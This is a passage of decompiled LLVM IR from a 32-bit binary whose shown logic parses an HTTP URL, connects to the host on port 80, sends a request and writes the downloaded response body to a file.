  store i32 0, i32* %stack_var_-5244, align 4
  %v1_8048983 = call i32 @function_804e884(i32 0)
  %v0_8048988.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048988

dec_label_pc_8048988:                             ; preds = %dec_label_pc_8048962, %dec_label_pc_8048968
  %v0_8048988 = phi i32 [ %v0_8048988.pre, %dec_label_pc_8048968 ], [ %v12_8048946, %dec_label_pc_8048962 ]
  %v5_8048988 = icmp ult i32 %v0_8048988, 4
  store i1 %v5_8048988, i1* %cf.global-to-local, align 1
  store i32 2, i32* %stack_var_-5244, align 4
  %v4_8048991 = call i32 @function_804d6e8(i32 2, i32 1, i32 0)
  %v8_804899c = icmp ne i32 %v4_8048991, -1
  store i1 %v8_804899c, i1* %cf.global-to-local, align 1
  %v13_804899c = icmp eq i32 %v4_8048991, -1
  %v1_80489a0 = icmp eq i1 %v13_804899c, false
  br i1 %v1_80489a0, label %dec_label_pc_80489c2, label %dec_label_pc_80489a2

dec_label_pc_80489a2:                             ; preds = %dec_label_pc_8048988
  %v5_80489a2 = icmp ult i32* %stack_var_-5228, inttoptr (i32 4 to i32*)
  store i1 %v5_80489a2, i1* %cf.global-to-local, align 1
  store i32 %arg1, i32* %stack_var_-5244, align 4
  %v3_80489b0 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_8051ee0.18 to i32))
  store i32 %v3_80489b0, i32* @eax, align 4
  store i1 %v5_804894c, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-5244, align 4
  %v1_80489bd = call i32 @function_804e884(i32 0)
  br label %dec_label_pc_80489c2

dec_label_pc_80489c2:                             ; preds = %dec_label_pc_8048988, %dec_label_pc_80489a2
  %v1_80489c5 = add i32 %arg4, 4
  %v5_80489c5 = icmp ugt i32 %arg4, -5
  store i1 %v5_80489c5, i1* %cf.global-to-local, align 1
  %v1_80489c8 = inttoptr i32 %v1_80489c5 to i32*
  %v2_80489c8 = load i32, i32* %v1_80489c8, align 4
  store i1 false, i1* @df, align 1
  %v4_80489e5 = inttoptr i32 %v2_80489c8 to i8*
  store i32 %v2_80489c8, i32* @esi, align 4
  %v7_80489f7 = call i32 @_strncmp(i8* %v4_80489e5, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8051f05.19, i32 0, i32 0), i32 7)
  %v8_80489f7 = urem i32 %v7_80489f7, 2
  %v9_80489f7 = icmp eq i32 %v8_80489f7, 0
  %v0_80489f9 = load i1, i1* %cf.global-to-local, align 1
  %v2_80489f9 = or i1 %v0_80489f9, %v9_80489f7
  %v3_80489f9 = zext i1 %v2_80489f9 to i32
  %v4_80489f9 = load i32, i32* @edx, align 4
  %v5_80489f9 = and i32 %v4_80489f9, -256
  %v6_80489f9 = or i32 %v3_80489f9, %v5_80489f9
  %v7_80489f9 = xor i32 %v6_80489f9, 1
  store i32 %v7_80489f9, i32* %edx.global-to-local, align 4
  %v1_8048a01 = trunc i32 %v7_80489f9 to i8
  %v3_8048a01 = zext i1 %v0_80489f9 to i8
  %v15_8048a01 = icmp eq i8 %v1_8048a01, %v3_8048a01
  %v1_8048a0a = icmp eq i1 %v15_8048a01, false
  store i1 %v5_80489c5, i1* %cf.global-to-local, align 1
  %v2_8048a32 = load i32, i32* %v1_80489c8, align 4
  br i1 %v1_8048a0a, label %dec_label_pc_8048a2c, label %dec_label_pc_8048a0c

dec_label_pc_8048a0c:                             ; preds = %dec_label_pc_80489c2
  %v1_8048a14 = add i32 %v2_8048a32, 7
  %v0_8048a17 = load i32, i32* @esp, align 4
  %v5_8048a17 = icmp ult i32 %v0_8048a17, 8
  store i1 %v5_8048a17, i1* %cf.global-to-local, align 1
  %v2_8048a1b = ptrtoint i32* %stack_var_-1096 to i32
  store i32 %v2_8048a1b, i32* @eax, align 4
  %v3_8048a22 = bitcast i32* %stack_var_-1096 to i8*
  %v4_8048a22 = call i32 @function_804ce78(i8* %v3_8048a22, i32 %v1_8048a14)
  br label %dec_label_pc_8048a47

dec_label_pc_8048a2c:                             ; preds = %dec_label_pc_80489c2
  %v0_8048a34 = load i32, i32* @esp, align 4
  %v5_8048a34 = icmp ult i32 %v0_8048a34, 8
  store i1 %v5_8048a34, i1* %cf.global-to-local, align 1
  %v2_8048a38 = ptrtoint i32* %stack_var_-1096 to i32
  store i32 %v2_8048a38, i32* @eax, align 4
  %v3_8048a3f = bitcast i32* %stack_var_-1096 to i8*
  %v4_8048a3f = call i32 @function_804ce78(i8* %v3_8048a3f, i32 %v2_8048a32)
  br label %dec_label_pc_8048a47

dec_label_pc_8048a47:                             ; preds = %dec_label_pc_8048a0c, %dec_label_pc_8048a2c
  %v4_8048a6a.pre-phi = phi i8* [ %v3_8048a22, %dec_label_pc_8048a0c ], [ %v3_8048a3f, %dec_label_pc_8048a2c ]
  %v2_8048a56.pre-phi = phi i32 [ %v2_8048a1b, %dec_label_pc_8048a0c ], [ %v2_8048a38, %dec_label_pc_8048a2c ]
  %storemerge16.in = load i32, i32* @esp, align 4
  %storemerge16 = icmp ugt i32 %storemerge16.in, -17
  store i1 %storemerge16, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048a53

dec_label_pc_8048a50:                             ; preds = %dec_label_pc_8048a7b
  %v4_8048a50 = add i32 %storemerge8, 1
  br label %dec_label_pc_8048a53

dec_label_pc_8048a53:                             ; preds = %dec_label_pc_8048a47, %dec_label_pc_8048a50
  %storemerge8 = phi i32 [ %v4_8048a50, %dec_label_pc_8048a50 ], [ 0, %dec_label_pc_8048a47 ]
  store i32 %storemerge8, i32* @edx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v2_8048a56.pre-phi, i32* @edi, align 4
  %v3_8048a70 = call i32 @_strlen(i8* %v4_8048a6a.pre-phi)
  %v0_8048a77 = load i32, i32* @edx, align 4
  %v7_8048a77 = icmp ult i32 %v0_8048a77, %v3_8048a70
  store i1 %v7_8048a77, i1* %cf.global-to-local, align 1
  %v1_8048a79 = icmp eq i1 %v7_8048a77, false
  br i1 %v1_8048a79, label %dec_label_pc_8048a53.dec_label_pc_8048a89_crit_edge, label %dec_label_pc_8048a7b

dec_label_pc_8048a53.dec_label_pc_8048a89_crit_edge: ; preds = %dec_label_pc_8048a53
  %v0_8048a8c.pre = load i32, i32* @ebp, align 4
  %.pre = add i32 %storemerge8, -1092
  br label %dec_label_pc_8048a89

dec_label_pc_8048a7b:                             ; preds = %dec_label_pc_8048a53
  %v0_8048a7e = load i32, i32* @ebp, align 4
  %v2_8048a7e = add i32 %storemerge8, -1092
  %v3_8048a7e = add i32 %v0_8048a7e, %v2_8048a7e
  %v4_8048a7e = inttoptr i32 %v3_8048a7e to i8*
  %v5_8048a7e = load i8, i8* %v4_8048a7e, align 1
  %v6_8048a85 = icmp ult i8 %v5_8048a7e, 47
  store i1 %v6_8048a85, i1* %cf.global-to-local, align 1
  %v10_8048a85 = icmp eq i8 %v5_8048a7e, 47
  %v1_8048a87 = icmp eq i1 %v10_8048a85, false
  br i1 %v1_8048a87, label %dec_label_pc_8048a50, label %dec_label_pc_8048a89

dec_label_pc_8048a89:                             ; preds = %dec_label_pc_8048a7b, %dec_label_pc_8048a53.dec_label_pc_8048a89_crit_edge
  %v2_8048a8c.pre-phi = phi i32 [ %.pre, %dec_label_pc_8048a53.dec_label_pc_8048a89_crit_edge ], [ %v2_8048a7e, %dec_label_pc_8048a7b ]
  %v0_8048a8c = phi i32 [ %v0_8048a8c.pre, %dec_label_pc_8048a53.dec_label_pc_8048a89_crit_edge ], [ %v0_8048a7e, %dec_label_pc_8048a7b ]
  %v3_8048a8c = add i32 %v0_8048a8c, %v2_8048a8c.pre-phi
  %v4_8048a8c = inttoptr i32 %v3_8048a8c to i8*
  store i8 0, i8* %v4_8048a8c, align 1
  store i32 2, i32* %stack_var_-72, align 4
  %v0_8048a9a = load i32, i32* @esp, align 4
  %v5_8048a9a = icmp ult i32 %v0_8048a9a, 12
  store i1 %v5_8048a9a, i1* %cf.global-to-local, align 1
  %v1_8048a9f = call i32 @function_804d0f8(i32 80)
  %v5_8048aab = icmp ult i32* %stack_var_-5244, inttoptr (i32 12 to i32*)
  store i1 %v5_8048aab, i1* %cf.global-to-local, align 1
  %v1_8048ab5 = call i32 @function_804d200(i32 %v2_8048a56.pre-phi)
  %v8_8048ac0 = icmp ne i32 %v1_8048ab5, -1
  store i1 %v8_8048ac0, i1* %cf.global-to-local, align 1
  %v13_8048ac0 = icmp eq i32 %v1_8048ab5, -1
  %v1_8048ac4 = icmp eq i1 %v13_8048ac0, false
  br i1 %v1_8048ac4, label %dec_label_pc_8048b20, label %dec_label_pc_8048ac6

dec_label_pc_8048ac6:                             ; preds = %dec_label_pc_8048a89
  store i1 %v5_8048aab, i1* %cf.global-to-local, align 1
  %v1_8048ad0 = call i32 @function_804d228(i32 %v2_8048a56.pre-phi)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8048adb = icmp eq i32 %v1_8048ad0, 0
  %v1_8048adf = icmp eq i1 %v4_8048adb, false
  br i1 %v1_8048adf, label %dec_label_pc_8048b01, label %dec_label_pc_8048ae1

dec_label_pc_8048ae1:                             ; preds = %dec_label_pc_8048ac6
  %v5_8048ae1 = icmp ult i32* %stack_var_-5244, inttoptr (i32 4 to i32*)
  store i1 %v5_8048ae1, i1* %cf.global-to-local, align 1
  %v3_8048aef = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_8051f10.20 to i32))
  store i32 %v3_8048aef, i32* @eax, align 4
  store i1 %v5_8048aab, i1* %cf.global-to-local, align 1
  %v1_8048afc = call i32 @function_804e884(i32 0)
  br label %dec_label_pc_8048b01

dec_label_pc_8048b01:                             ; preds = %dec_label_pc_8048ac6, %dec_label_pc_8048ae1
  %v1_8048b04 = add i32 %v1_8048ad0, 12
  %v2_8048b04 = inttoptr i32 %v1_8048b04 to i32*
  %v3_8048b04 = load i32, i32* %v2_8048b04, align 4
  %v1_8048b0c = add i32 %v1_8048ad0, 16
  %v2_8048b0c = inttoptr i32 %v1_8048b0c to i32*
  %v3_8048b0c = load i32, i32* %v2_8048b0c, align 4
  %v1_8048b0f = inttoptr i32 %v3_8048b0c to i32*
  %v2_8048b0f = load i32, i32* %v1_8048b0f, align 4
  store i32 %v2_8048b0f, i32* %edx.global-to-local, align 4
  %v5_8048b14 = icmp eq i32* %stack_var_-72, inttoptr (i32 -4 to i32*)
  store i1 %v5_8048b14, i1* %cf.global-to-local, align 1
  %v15_8048b14 = ptrtoint i32* %stack_var_-68 to i32
  %tmp88 = bitcast i32* %stack_var_-68 to i8*
  store i32 %v15_8048b14, i32* @edi, align 4
  %v1_8048b19 = inttoptr i32 %v2_8048b0f to i8*
  store i32 %v2_8048b0f, i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_8048b1c = call i8* @_memcpy(i8* %tmp88, i8* %v1_8048b19, i32 %v3_8048b04)
  %v0_8048b3c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048b26

dec_label_pc_8048b20:                             ; preds = %dec_label_pc_8048a89
  store i32 %v1_8048ab5, i32* %stack_var_-68, align 4
  br label %dec_label_pc_8048b26

dec_label_pc_8048b26:                             ; preds = %dec_label_pc_8048b01, %dec_label_pc_8048b20
  %v0_8048b3c = phi i32 [ %v0_8048b3c.pre, %dec_label_pc_8048b01 ], [ %v7_804894f, %dec_label_pc_8048b20 ]
  %v2_8048b26.pre-phi = ptrtoint i32* %stack_var_-72 to i32
  %v5_8048b3c = icmp ult i32 %v0_8048b3c, 4
  store i1 %v5_8048b3c, i1* %cf.global-to-local, align 1
  %v4_8048b45 = call i32 @function_804d5e4(i32 %v4_8048991, i32 %v2_8048b26.pre-phi, i32 16)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048b4d = icmp eq i32 %v4_8048b45, 0
  br i1 %v1_8048b4d, label %dec_label_pc_8048b71, label %dec_label_pc_8048b51

dec_label_pc_8048b51:                             ; preds = %dec_label_pc_8048b26
  %v5_8048b51 = icmp ult i32* %stack_var_-5244, inttoptr (i32 4 to i32*)
  store i1 %v5_8048b51, i1* %cf.global-to-local, align 1
  %v3_8048b5f = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_8051f38.21 to i32))
  store i32 %v3_8048b5f, i32* @eax, align 4
  store i1 %v5_8048aab, i1* %cf.global-to-local, align 1
  %v1_8048b6c = call i32 @function_804e884(i32 0)
  br label %dec_label_pc_8048b71

dec_label_pc_8048b71:                             ; preds = %dec_label_pc_8048b26, %dec_label_pc_8048b51
  %v2_8048b7c = add i32 %storemerge8, %v2_8048a56.pre-phi
  %v7_8048b7c = icmp ult i32 %v2_8048b7c, %v2_8048a56.pre-phi
  store i1 %v7_8048b7c, i1* %cf.global-to-local, align 1
  %v1_8048b7e = add i32 %v2_8048b7c, 1
  store i32 %v1_8048b7e, i32* %edx.global-to-local, align 4
  %v3_8048b91 = call i32 @function_80482b2(i32 %v4_8048991, i32 ptrtoint ([276 x i8]* @global_var_8051f60.22 to i32))
  %v5_8048b99 = icmp ult i32* %stack_var_-5244, inttoptr (i32 4 to i32*)
  store i1 %v5_8048b99, i1* %cf.global-to-local, align 1
  %v3_8048ba7 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_8052074.23 to i32))
  %v1_8048bb2 = add i32 %arg4, 8
  %v5_8048bb2 = icmp ugt i32 %arg4, -9
  %v1_8048bb5 = inttoptr i32 %v1_8048bb2 to i32*
  %v2_8048bb5 = load i32, i32* %v1_8048bb5, align 4
  store i32 %v2_8048bb5, i32* @eax, align 4
  %v5_8048bb7 = icmp ult i32* %stack_var_-5244, inttoptr (i32 8 to i32*)
  store i1 %v5_8048bb7, i1* %cf.global-to-local, align 1
  %v3_8048bc0 = call i32 @function_804b5d0(i32 %v2_8048bb5, i32 ptrtoint ([3 x i8]* @global_var_8052090.24 to i32))
  %v0_8048bc5 = load i32, i32* @esp, align 4
  %v2_8048bc5 = icmp ugt i32 %v0_8048bc5, -17
  store i1 %v2_8048bc5, i1* %cf.global-to-local, align 1
  %v2_8048bd2 = ptrtoint i32* %stack_var_-5192 to i32
  %v5_8048bdc111 = call i32 @function_804d634(i32 %v4_8048991, i32 %v2_8048bd2, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp89113 = icmp slt i32 %v5_8048bdc111, 1
  br i1 %tmp89113, label %dec_label_pc_8048d08.loopexit17, label %dec_label_pc_8048bf1

dec_label_pc_8048bcb.loopexit:                    ; preds = %dec_label_pc_8048cf4
  %v5_8048bdc = call i32 @function_804d634(i32 %v4_8048991, i32 %v2_8048bd2, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp89 = icmp slt i32 %v5_8048bdc, 1
  br i1 %tmp89, label %dec_label_pc_8048d08.loopexit17, label %dec_label_pc_8048bf1

dec_label_pc_8048bf1:                             ; preds = %dec_label_pc_8048b71, %dec_label_pc_8048bcb.loopexit
  %v5_8048bdc114 = phi i32 [ %v5_8048bdc, %dec_label_pc_8048bcb.loopexit ], [ %v5_8048bdc111, %dec_label_pc_8048b71 ]
  %v4_8048bf1 = add i32 %v5_8048bdc114, -4095
  %v8_8048bf1 = icmp ult i32 %v5_8048bdc114, 4095
  %v9_8048bf1 = sub i32 4094, %v5_8048bdc114
  %v10_8048bf1 = and i32 %v9_8048bf1, %v5_8048bdc114
  %v11_8048bf1 = icmp slt i32 %v10_8048bf1, 0
  store i1 %v8_8048bf1, i1* %cf.global-to-local, align 1
  %v12_8048bf1 = icmp eq i32 %v4_8048bf1, 0
  %v13_8048bf1 = icmp slt i32 %v4_8048bf1, 0
  %v3_8048bf8 = icmp eq i1 %v13_8048bf1, %v11_8048bf1
  %v4_8048bf8 = icmp eq i1 %v12_8048bf1, false
  %v5_8048bf8 = and i1 %v4_8048bf8, %v3_8048bf8
  br i1 %v5_8048bf8, label %dec_label_pc_8048c11.lr.ph, label %dec_label_pc_8048bfa

dec_label_pc_8048bfa:                             ; preds = %dec_label_pc_8048bf1
  %v0_8048bfd = load i32, i32* @ebp, align 4
  %v2_8048bfd = add i32 %v5_8048bdc114, -5188
  %v3_8048bfd = add i32 %v2_8048bfd, %v0_8048bfd
  %v4_8048bfd = inttoptr i32 %v3_8048bfd to i8*
  store i8 0, i8* %v4_8048bfd, align 1
  br label %dec_label_pc_8048c11.lr.ph

dec_label_pc_8048c11.lr.ph:                       ; preds = %dec_label_pc_8048bfa, %dec_label_pc_8048bf1
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048c11

dec_label_pc_8048c11:                             ; preds = %dec_label_pc_8048c11.lr.ph, %dec_label_pc_8048cf4
  %storemerge7110 = phi i32 [ 0, %dec_label_pc_8048c11.lr.ph ], [ %v4_8048cf4, %dec_label_pc_8048cf4 ]
  store i32 %storemerge7110, i32* %edx.global-to-local, align 4
  %v2_8048c1c = add i32 %storemerge7110, %v2_8048bd2
  %v7_8048c1c = icmp ult i32 %v2_8048c1c, %v2_8048bd2
  store i1 %v7_8048c1c, i1* %cf.global-to-local, align 1
  store i1 false, i1* @df, align 1
  %v4_8048c39 = inttoptr i32 %v2_8048c1c to i8*
  store i32 %v2_8048c1c, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8052093.25 to i32), i32* @edi, align 4
  %v7_8048c4b = call i32 @_strncmp(i8* %v4_8048c39, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8052093.25, i32 0, i32 0), i32 4)
  %v8_8048c4b = urem i32 %v7_8048c4b, 2
  %v9_8048c4b = icmp eq i32 %v8_8048c4b, 0
  %v0_8048c4d = load i1, i1* %cf.global-to-local, align 1
  %v2_8048c4d = or i1 %v0_8048c4d, %v9_8048c4b
  %v3_8048c4d = zext i1 %v2_8048c4d to i32
  %v4_8048c4d = load i32, i32* %edx.global-to-local, align 4
  %v5_8048c4d = and i32 %v4_8048c4d, -256
  %v6_8048c4d = or i32 %v3_8048c4d, %v5_8048c4d
  %v7_8048c4d = xor i32 %v6_8048c4d, 1
  store i32 %v7_8048c4d, i32* @edx, align 4
  %v3_8048c53 = and i32 %v7_8048c4b, -256
  %v1_8048c55 = trunc i32 %v7_8048c4d to i8
  %v3_8048c55 = zext i1 %v0_8048c4d to i8
  %v4_8048c55 = sub nsw i8 %v1_8048c55, %v3_8048c55
  %v15_8048c55 = icmp eq i8 %v4_8048c55, 0
  %v20_8048c55 = zext i8 %v4_8048c55 to i32
  %v23_8048c55 = or i32 %v20_8048c55, %v3_8048c53
  store i32 %v23_8048c55, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048c5e = icmp eq i1 %v15_8048c55, false
  br i1 %v1_8048c5e, label %dec_label_pc_8048cf4, label %dec_label_pc_8048c64

dec_label_pc_8048c64:                             ; preds = %dec_label_pc_8048c11
  %v4_8048c64 = add i32 %storemerge7110, 4
  %v1_8048c73 = add i32 %v3_8048bc0, 52
  %v2_8048c73 = inttoptr i32 %v1_8048c73 to i32*
  %v1_8048c7d = add i32 %v3_8048bc0, 16
  %v2_8048c7d = inttoptr i32 %v1_8048c7d to i32*
  %v1_8048c83 = add i32 %v3_8048bc0, 28
  %v2_8048c83 = inttoptr i32 %v1_8048c83 to i32*
  %v10_8048ce9103 = icmp ult i32 %v4_8048c64, %v5_8048bdc114
  store i1 %v10_8048ce9103, i1* %cf.global-to-local, align 1
  %v5_8048cec105 = icmp slt i32 %v4_8048c64, %v5_8048bdc114
  br i1 %v5_8048cec105, label %dec_label_pc_8048c6a, label %dec_label_pc_8048d08

dec_label_pc_8048c6a:                             ; preds = %dec_label_pc_8048c64, %dec_label_pc_8048ce3
  %storemerge13.in106 = phi i32 [ %v4_8048ce3, %dec_label_pc_8048ce3 ], [ %v4_8048c64, %dec_label_pc_8048c64 ]
  %v3_8048c73 = load i32, i32* %v2_8048c73, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048c76 = icmp eq i32 %v3_8048c73, 0
  br i1 %v1_8048c76, label %dec_label_pc_8048cc5, label %dec_label_pc_8048c7a

dec_label_pc_8048c7a:                             ; preds = %dec_label_pc_8048c6a
  %v3_8048c7d = load i32, i32* %v2_8048c7d, align 4
  store i32 %v3_8048c7d, i32* @edx, align 4
  %v3_8048c83 = load i32, i32* %v2_8048c83, align 4
  %v7_8048c86 = icmp ult i32 %v3_8048c7d, %v3_8048c83
  store i1 %v7_8048c86, i1* %cf.global-to-local, align 1
  %v1_8048c88 = icmp eq i1 %v7_8048c86, false
  br i1 %v1_8048c88, label %dec_label_pc_8048ca5, label %dec_label_pc_8048c8a

dec_label_pc_8048c8a:                             ; preds = %dec_label_pc_8048c7a
  %v3_8048c8d = load i32, i32* %v2_8048c7d, align 4
  store i32 %v3_8048c8d, i32* %edx.global-to-local, align 4
  %v0_8048c93 = load i32, i32* @ebp, align 4
  %v2_8048c93 = add i32 %storemerge13.in106, -5188
  %v3_8048c93 = add i32 %v2_8048c93, %v0_8048c93
  %v4_8048c93 = inttoptr i32 %v3_8048c93 to i8*
  %v5_8048c93 = load i8, i8* %v4_8048c93, align 1
  %v3_8048c9a = inttoptr i32 %v3_8048c8d to i8*
  store i8 %v5_8048c93, i8* %v3_8048c9a, align 1
  %v0_8048c9c = load i32, i32* %edx.global-to-local, align 4
  %v1_8048c9c = add i32 %v0_8048c9c, 1
  store i32 %v1_8048c9c, i32* @edx, align 4
  store i32 %v1_8048c9c, i32* %v2_8048c7d, align 4
  br label %dec_label_pc_8048ce3

dec_label_pc_8048ca5:                             ; preds = %dec_label_pc_8048c7a
  %v0_8048ca8 = load i32, i32* @ebp, align 4
  %v2_8048ca8 = add i32 %storemerge13.in106, -5188
  %v3_8048ca8 = add i32 %v2_8048ca8, %v0_8048ca8
  %v4_8048ca8 = inttoptr i32 %v3_8048ca8 to i8*
  %v5_8048ca8 = load i8, i8* %v4_8048ca8, align 1
  %v0_8048cb4 = load i32, i32* @esp, align 4
  %v5_8048cb4 = icmp ult i32 %v0_8048cb4, 8
  store i1 %v5_8048cb4, i1* %cf.global-to-local, align 1
  %v4_8048cbb = call i32 @function_804ccc8(i8 %v5_8048ca8, i32 %v3_8048bc0)
  %v0_8048cc0 = load i32, i32* @esp, align 4
  %v2_8048cc0 = icmp ugt i32 %v0_8048cc0, -17
  store i1 %v2_8048cc0, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048ce3

dec_label_pc_8048cc5:                             ; preds = %dec_label_pc_8048c6a
  %v0_8048cc8 = load i32, i32* @ebp, align 4
  %v2_8048cc8 = add i32 %storemerge13.in106, -5188
  %v3_8048cc8 = add i32 %v2_8048cc8, %v0_8048cc8
  %v4_8048cc8 = inttoptr i32 %v3_8048cc8 to i8*
  %v5_8048cc8 = load i8, i8* %v4_8048cc8, align 1
  %v0_8048cd4 = load i32, i32* @esp, align 4
  %v5_8048cd4 = icmp ult i32 %v0_8048cd4, 8
  store i1 %v5_8048cd4, i1* %cf.global-to-local, align 1
  %v4_8048cdb = call i32 @function_804c9a0(i8 %v5_8048cc8, i32 %v3_8048bc0)
  %v0_8048ce0 = load i32, i32* @esp, align 4
  %v2_8048ce0 = icmp ugt i32 %v0_8048ce0, -17
  store i1 %v2_8048ce0, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048ce3

dec_label_pc_8048ce3:                             ; preds = %dec_label_pc_8048ca5, %dec_label_pc_8048c8a, %dec_label_pc_8048cc5
  %v4_8048ce3 = add i32 %storemerge13.in106, 1
  %v10_8048ce9 = icmp ult i32 %v4_8048ce3, %v5_8048bdc114
  store i1 %v10_8048ce9, i1* %cf.global-to-local, align 1
  %exitcond119 = icmp eq i32 %v4_8048ce3, %v5_8048bdc114
  br i1 %exitcond119, label %dec_label_pc_8048d08, label %dec_label_pc_8048c6a

dec_label_pc_8048cf4:                             ; preds = %dec_label_pc_8048c11
  %v4_8048cf4 = add nuw nsw i32 %storemerge7110, 1
  %v10_8048cfa = icmp ult i32 %v4_8048cf4, %v5_8048bdc114
  store i1 %v10_8048cfa, i1* %cf.global-to-local, align 1
  %v5_8048cfd = icmp slt i32 %v4_8048cf4, %v5_8048bdc114
  br i1 %v5_8048cfd, label %dec_label_pc_8048c11, label %dec_label_pc_8048bcb.loopexit

dec_label_pc_8048d08.loopexit17:                  ; preds = %dec_label_pc_8048bcb.loopexit, %dec_label_pc_8048b71
  %.pre31 = add i32 %v3_8048bc0, 52
  %.pre32 = inttoptr i32 %.pre31 to i32*
  %.pre34 = add i32 %v3_8048bc0, 16
  %.pre35 = inttoptr i32 %.pre34 to i32*
  %.pre36 = add i32 %v3_8048bc0, 28
  %.pre37 = inttoptr i32 %.pre36 to i32*
  br label %dec_label_pc_8048d08

dec_label_pc_8048d08:                             ; preds = %dec_label_pc_8048c64, %dec_label_pc_8048ce3, %dec_label_pc_8048d08.loopexit17
  %v2_8048d80.pre-phi = phi i32* [ %.pre37, %dec_label_pc_8048d08.loopexit17 ], [ %v2_8048c83, %dec_label_pc_8048ce3 ], [ %v2_8048c83, %dec_label_pc_8048c64 ]
  %v2_8048d7a.pre-phi = phi i32* [ %.pre35, %dec_label_pc_8048d08.loopexit17 ], [ %v2_8048c7d, %dec_label_pc_8048ce3 ], [ %v2_8048c7d, %dec_label_pc_8048c64 ]
  %v2_8048d70.pre-phi = phi i32* [ %.pre32, %dec_label_pc_8048d08.loopexit17 ], [ %v2_8048c73, %dec_label_pc_8048ce3 ], [ %v2_8048c73, %dec_label_pc_8048c64 ]
  store i1 %v5_8048bb2, i1* %cf.global-to-local, align 1
  %v3_8048d1c = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_8052098.26 to i32))
  %v0_8048d21 = load i32, i32* @esp, align 4
  %v2_8048d21 = icmp ugt i32 %v0_8048d21, -17
  store i1 %v2_8048d21, i1* %cf.global-to-local, align 1
  %v5_8048d3599 = call i32 @function_804d634(i32 %v4_8048991, i32 %v2_8048bd2, i32 4096, i32 0)
  store i32 %v5_8048d3599, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp90101 = icmp slt i32 %v5_8048d3599, 1
  br i1 %tmp90101, label %dec_label_pc_8048df4, label %dec_label_pc_8048d4a

dec_label_pc_8048d24.loopexit:                    ; preds = %dec_label_pc_8048de0
  %v5_8048d35 = call i32 @function_804d634(i32 %v4_8048991, i32 %v2_8048bd2, i32 4096, i32 0)
  store i32 %v5_8048d35, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp90 = icmp slt i32 %v5_8048d35, 1
  br i1 %tmp90, label %dec_label_pc_8048df4, label %dec_label_pc_8048d4a

dec_label_pc_8048d4a:                             ; preds = %dec_label_pc_8048d08, %dec_label_pc_8048d24.loopexit
  %v5_8048d35102 = phi i32 [ %v5_8048d35, %dec_label_pc_8048d24.loopexit ], [ %v5_8048d3599, %dec_label_pc_8048d08 ]
  %v4_8048d4a = add i32 %v5_8048d35102, -4095
  %v8_8048d4a = icmp ult i32 %v5_8048d35102, 4095
  %v9_8048d4a = sub i32 4094, %v5_8048d35102
  %v10_8048d4a = and i32 %v9_8048d4a, %v5_8048d35102
  %v11_8048d4a = icmp slt i32 %v10_8048d4a, 0
  store i1 %v8_8048d4a, i1* %cf.global-to-local, align 1
  %v12_8048d4a = icmp eq i32 %v4_8048d4a, 0
  %v13_8048d4a = icmp slt i32 %v4_8048d4a, 0
  %v3_8048d51 = icmp eq i1 %v13_8048d4a, %v11_8048d4a
  %v4_8048d51 = icmp eq i1 %v12_8048d4a, false
  %v5_8048d51 = and i1 %v4_8048d51, %v3_8048d51
  br i1 %v5_8048d51, label %dec_label_pc_8048d67.lr.ph, label %dec_label_pc_8048d53

dec_label_pc_8048d53:                             ; preds = %dec_label_pc_8048d4a
  %v0_8048d56 = load i32, i32* @ebp, align 4
  %v2_8048d56 = add i32 %v5_8048d35102, -5188
  %v3_8048d56 = add i32 %v2_8048d56, %v0_8048d56
  %v4_8048d56 = inttoptr i32 %v3_8048d56 to i8*
  store i8 0, i8* %v4_8048d56, align 1
  br label %dec_label_pc_8048d67.lr.ph

dec_label_pc_8048d67.lr.ph:                       ; preds = %dec_label_pc_8048d53, %dec_label_pc_8048d4a
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048d67

dec_label_pc_8048d67:                             ; preds = %dec_label_pc_8048de0, %dec_label_pc_8048d67.lr.ph
  %storemerge598 = phi i32 [ 0, %dec_label_pc_8048d67.lr.ph ], [ %v4_8048de0, %dec_label_pc_8048de0 ]
  %v3_8048d70 = load i32, i32* %v2_8048d70.pre-phi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048d73 = icmp eq i32 %v3_8048d70, 0
  br i1 %v1_8048d73, label %dec_label_pc_8048dc2, label %dec_label_pc_8048d77

dec_label_pc_8048d77:                             ; preds = %dec_label_pc_8048d67
  %v3_8048d7a = load i32, i32* %v2_8048d7a.pre-phi, align 4
  store i32 %v3_8048d7a, i32* @edx, align 4
  %v3_8048d80 = load i32, i32* %v2_8048d80.pre-phi, align 4
  %v7_8048d83 = icmp ult i32 %v3_8048d7a, %v3_8048d80
  store i1 %v7_8048d83, i1* %cf.global-to-local, align 1
  %v1_8048d85 = icmp eq i1 %v7_8048d83, false
  br i1 %v1_8048d85, label %dec_label_pc_8048da2, label %dec_label_pc_8048d87

dec_label_pc_8048d87:                             ; preds = %dec_label_pc_8048d77
  %v3_8048d8a = load i32, i32* %v2_8048d7a.pre-phi, align 4
  store i32 %v3_8048d8a, i32* %edx.global-to-local, align 4
  %v0_8048d90 = load i32, i32* @ebp, align 4
